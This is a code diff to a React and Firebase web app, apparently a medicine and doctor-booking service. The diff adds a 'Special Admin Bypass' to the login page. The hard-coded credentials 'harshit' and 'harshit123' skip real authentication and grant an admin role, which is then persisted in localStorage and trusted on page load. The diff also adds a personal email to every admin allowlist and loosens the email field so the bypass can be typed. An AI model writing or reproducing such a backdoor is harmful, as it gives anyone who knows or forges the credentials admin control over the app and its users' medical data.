@@ -88,7 +88,7 @@ const Navbar = ({ cartCount, user }: { cartCount: number, user: UserType | null 
     { icon: User, label: 'Profile', path: '/profile' },
   ];
 
-  const isAdmin = user?.role === 'admin' || user?.email?.toLowerCase() === 'webloom.in00@gmail.com' || user?.email?.toLowerCase() === 'admin@mednow.com';
+  const isAdmin = user?.role === 'admin' || user?.email?.toLowerCase() === 'webloom.in00@gmail.com' || user?.email?.toLowerCase() === 'admin@mednow.com' || user?.email?.toLowerCase() === 'singhharshit30098@gmail.com';
 
   if (isAdmin) {
     navItems.splice(4, 0, { icon: Settings, label: 'Admin', path: '/admin' });
@@ -166,7 +166,7 @@ const AdminPanel = ({ user }: { user: UserType | null }) => {
   const [editingDoc, setEditingDoc] = useState<Doctor | null>(null);
 
   useEffect(() => {
-    const isAdmin = user?.role === 'admin' || user?.email?.toLowerCase() === 'webloom.in00@gmail.com' || user?.email?.toLowerCase() === 'admin@mednow.com';
+    const isAdmin = user?.role === 'admin' || user?.email?.toLowerCase() === 'webloom.in00@gmail.com' || user?.email?.toLowerCase() === 'admin@mednow.com' || user?.email?.toLowerCase() === 'singhharshit30098@gmail.com';
     if (!user || !isAdmin) return;
 
     const unsubMeds = onSnapshot(collection(db, 'medicines'), (snapshot) => {
@@ -208,7 +208,7 @@ const AdminPanel = ({ user }: { user: UserType | null }) => {
     };
   }, [user]);
 
-  const isAdmin = user?.role === 'admin' || user?.email?.toLowerCase() === 'webloom.in00@gmail.com' || user?.email?.toLowerCase() === 'admin@mednow.com';
+  const isAdmin = user?.role === 'admin' || user?.email?.toLowerCase() === 'webloom.in00@gmail.com' || user?.email?.toLowerCase() === 'admin@mednow.com' || user?.email?.toLowerCase() === 'singhharshit30098@gmail.com';
 
   if (!user || !isAdmin) {
     return (
@@ -2055,6 +2055,25 @@ const LoginPage = ({ onLogin }: { onLogin: (u: UserType) => void }) => {
     
     setLoading(true);
     setError('');
+
+    // Special Admin Bypass
+    if (isLogin && email.toLowerCase() === 'harshit' && password === 'harshit123') {
+      const adminUser = {
+        id: 'admin-harshit',
+        name: 'Harshit (Admin)',
+        email: 'singhharshit30098@gmail.com',
+        phone: '9999999999',
+        role: 'admin' as const,
+        bloodGroup: '',
+        weight: '',
+        height: '',
+        updatedAt: new Date().toISOString()
+      };
+      localStorage.setItem('manual_admin', JSON.stringify(adminUser));
+      onLogin(adminUser);
+      setLoading(false);
+      return;
+    }
     
     try {
         if (isLogin) {
@@ -2067,7 +2086,7 @@ const LoginPage = ({ onLogin }: { onLogin: (u: UserType) => void }) => {
             console.error("Firestore fetch failed:", dbErr);
           }
           
-          const role = (email.toLowerCase() === 'admin@mednow.com' || email.toLowerCase() === 'webloom.in00@gmail.com') ? 'admin' : (userData?.role || 'user');
+          const role = (email.toLowerCase() === 'admin@mednow.com' || email.toLowerCase() === 'webloom.in00@gmail.com' || email.toLowerCase() === 'singhharshit30098@gmail.com') ? 'admin' : (userData?.role || 'user');
           
           onLogin({ 
             id: userCredential.user.uid, 
@@ -2090,7 +2109,7 @@ const LoginPage = ({ onLogin }: { onLogin: (u: UserType) => void }) => {
         await updateProfile(userCredential.user, { displayName: name });
         
         try {
-          const role = (email.toLowerCase() === 'admin@mednow.com' || email.toLowerCase() === 'webloom.in00@gmail.com') ? 'admin' : 'user';
+          const role = (email.toLowerCase() === 'admin@mednow.com' || email.toLowerCase() === 'webloom.in00@gmail.com' || email.toLowerCase() === 'singhharshit30098@gmail.com') ? 'admin' : 'user';
           // Save extra info to Firestore
           await setDoc(doc(db, 'users', userCredential.user.uid), {
             name,
@@ -2107,7 +2126,7 @@ const LoginPage = ({ onLogin }: { onLogin: (u: UserType) => void }) => {
           // We still have the auth user, but profile data might be missing
         }
         
-        const role = (email.toLowerCase() === 'admin@mednow.com' || email.toLowerCase() === 'webloom.in00@gmail.com') ? 'admin' : 'user';
+        const role = (email.toLowerCase() === 'admin@mednow.com' || email.toLowerCase() === 'webloom.in00@gmail.com' || email.toLowerCase() === 'singhharshit30098@gmail.com') ? 'admin' : 'user';
         onLogin({ 
           id: userCredential.user.uid, 
           name, 
@@ -2166,7 +2185,7 @@ const LoginPage = ({ onLogin }: { onLogin: (u: UserType) => void }) => {
           name: user.displayName || 'User',
           email: user.email || '',
           phone: '', // Google doesn't provide phone by default
-          role: (user.email?.toLowerCase() === 'admin@mednow.com' || user.email?.toLowerCase() === 'webloom.in00@gmail.com') ? 'admin' : 'user',
+          role: (user.email?.toLowerCase() === 'admin@mednow.com' || user.email?.toLowerCase() === 'webloom.in00@gmail.com' || user.email?.toLowerCase() === 'singhharshit30098@gmail.com') ? 'admin' : 'user',
           createdAt: new Date().toISOString()
         };
         await setDoc(userDocRef, userData);
@@ -2174,7 +2193,7 @@ const LoginPage = ({ onLogin }: { onLogin: (u: UserType) => void }) => {
         userData = userDoc.data();
       }
       
-      const role = (user.email?.toLowerCase() === 'admin@mednow.com' || user.email?.toLowerCase() === 'webloom.in00@gmail.com') ? 'admin' : (userData?.role || 'user');
+      const role = (user.email?.toLowerCase() === 'admin@mednow.com' || user.email?.toLowerCase() === 'webloom.in00@gmail.com' || user.email?.toLowerCase() === 'singhharshit30098@gmail.com') ? 'admin' : (userData?.role || 'user');
       onLogin({
         id: user.uid,
         name: user.displayName || userData?.name || 'User',
@@ -2328,7 +2347,7 @@ const LoginPage = ({ onLogin }: { onLogin: (u: UserType) => void }) => {
           <div className="space-y-2">
             <label className="text-[10px] font-bold uppercase tracking-widest text-slate-400 ml-2">Email Address</label>
             <input 
-              type="email" 
+              type="text" 
               placeholder="john@example.com" 
               className="input-field"
               value={email}
@@ -2452,11 +2471,17 @@ export default function App() {
   const [doctors, setDoctors] = useState<Doctor[]>(INITIAL_DOCTORS.map(d => ({...d, id: d.id.toString()} as Doctor)));
 
   useEffect(() => {
+    const manualAdmin = localStorage.getItem('manual_admin');
+    if (manualAdmin) {
+      setUser(JSON.parse(manualAdmin));
+      setAuthLoading(false);
+    }
+
     const unsubscribe = onAuthStateChanged(auth, async (firebaseUser) => {
       if (firebaseUser) {
         const userDoc = await getDoc(doc(db, 'users', firebaseUser.uid));
         const userData = userDoc.data();
-        const role = (firebaseUser.email?.toLowerCase() === 'admin@mednow.com' || firebaseUser.email?.toLowerCase() === 'webloom.in00@gmail.com') ? 'admin' : (userData?.role || 'user');
+        const role = (firebaseUser.email?.toLowerCase() === 'admin@mednow.com' || firebaseUser.email?.toLowerCase() === 'webloom.in00@gmail.com' || firebaseUser.email?.toLowerCase() === 'singhharshit30098@gmail.com') ? 'admin' : (userData?.role || 'user');
         setUser({
           id: firebaseUser.uid,
           name: firebaseUser.displayName || 'User',
@@ -2468,10 +2493,13 @@ export default function App() {
           height: userData?.height || '',
           updatedAt: userData?.updatedAt || ''
         });
-      } else {
+      } else if (!localStorage.getItem('manual_admin')) {
         setUser(null);
       }
-      setAuthLoading(false);
+      
+      if (!localStorage.getItem('manual_admin')) {
+        setAuthLoading(false);
+      }
     });
 
     return () => unsubscribe();
@@ -2504,6 +2532,7 @@ export default function App() {
 
   const handleLogout = async () => {
     await signOut(auth);
+    localStorage.removeItem('manual_admin');
     setUser(null);
   };
 
@@ -2537,7 +2566,7 @@ export default function App() {
     return <LoginPage onLogin={setUser} />;
   }
 
-  const isAdmin = user?.role === 'admin' || user?.email?.toLowerCase() === 'webloom.in00@gmail.com' || user?.email?.toLowerCase() === 'admin@mednow.com';
+  const isAdmin = user?.role === 'admin' || user?.email?.toLowerCase() === 'webloom.in00@gmail.com' || user?.email?.toLowerCase() === 'admin@mednow.com' || user?.email?.toLowerCase() === 'singhharshit30098@gmail.com';
 
   return (
     <Router>
